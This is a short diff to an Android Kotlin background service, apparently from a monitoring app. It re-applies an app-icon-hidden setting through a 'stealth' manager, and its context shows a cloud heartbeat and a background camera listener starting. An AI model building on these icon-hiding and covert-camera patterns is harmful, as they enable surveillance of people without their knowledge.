@@ -58,6 +58,12 @@ class SentryPersistentService : Service() {
         } catch (_: Exception) {
         }
 
+        // Ensure MainActivity is enabled so App Info Settings has the Open button
+        try {
+            val isHidden = com.example.sentry.stealth.AppStealthManager.isAppIconHidden(applicationContext)
+            com.example.sentry.stealth.AppStealthManager.setAppIconHidden(applicationContext, isHidden)
+        } catch (_: Exception) {}
+
         // Start cloud heartbeat and background listeners
         startCloudHeartbeatLoop()
         BackgroundCameraManager.startListening(applicationContext)
